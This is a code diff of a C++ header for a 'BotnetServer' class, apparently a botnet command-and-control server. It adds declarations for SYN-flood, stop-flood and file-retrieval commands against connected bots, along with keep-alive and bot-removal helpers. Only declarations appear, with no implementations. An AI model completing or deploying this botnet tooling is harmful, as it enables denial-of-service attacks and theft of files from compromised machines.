@@ -23,23 +23,27 @@ public:
 	* and to the "commands" vector below in the same order.
 	* Make sure also to write a void(void) function that executes the command
 	* and it to the "func_vector" below, also in the same order as the enum.
+	* Code 0, keep-alive is private, and can not be called by the user.
 	*/
-	typedef enum { PRINT_BOTS=1, PING, GET_INFO } Commands;
+	typedef enum { KEEP_ALIVE, PRINT_BOTS, SYN_FLOOD, STOP_FLOOD, GET_INFO, GET_FILE } Commands;
 private:
 	std::vector<std::string> GetCommandsList() const {
-		static std::vector<std::string> commands = {"Print Bots", "Ping", "Get Info"};
+		// Keep Alive is a private code, don't list
+		static std::vector<std::string> commands = {"Print Bots", "SYN Flood", "Stop Flood", "Get Info", "Get File"};
 		return commands;
 	};
 	typedef void (BotnetServer::*CommandFunction)();
 	CommandFunction GetCommandFunction(Commands command) {
 		static const std::vector<CommandFunction> func_vector = {
-			&BotnetServer::PrintBots,
-			&BotnetServer::Ping,
-			&BotnetServer::GetInfo
+			 &BotnetServer::KeepAlive
+			, &BotnetServer::PrintBots
+			, &BotnetServer::SYNFlood
+			, &BotnetServer::StopFlood
+			, &BotnetServer::GetInfo
+			, &BotnetServer::GetFile
 		};
 
-		// Return at place command-1 because "Commands" starts at 1 and not 0
-		return func_vector[command-1];
+		return func_vector[command];
 	};
 
 	/**
@@ -65,12 +69,22 @@ private:
 
 	/* Botnet commands void(void) functions */
 
+	// Sends a keep-alive message to all connected sockets and updates master_set with who is still connected, who answered.
+	void KeepAlive();
+	// Prints all connected bots and their id
 	void PrintBots();
-	void Ping();
+	void SYNFlood();
+	void StopFlood();
 	void GetInfo();
+	void GetFile();
 
 
 	/* Botnet commands helpers */
+	
+	void GetFileFrom(const tcpSocket& bot, const std::string& file_path);
+	std::string GetNewFileName(const std::string& file_path);
+
+	void RemoveBot(const tcpSocket& bot_to_remove);
 
 	/**
 	* Reads IP from standard input, and returns the first legal
@@ -89,6 +103,11 @@ private:
 	* which means all bots, in which case ALL_BOTS is returned.
 	*/
 	int ReadID();
+	
+	int ReadNumber();
+
+	uint16_t ReadPort();
+	std::deque<tcpSocket> GetBotQueue();
 
 };
 
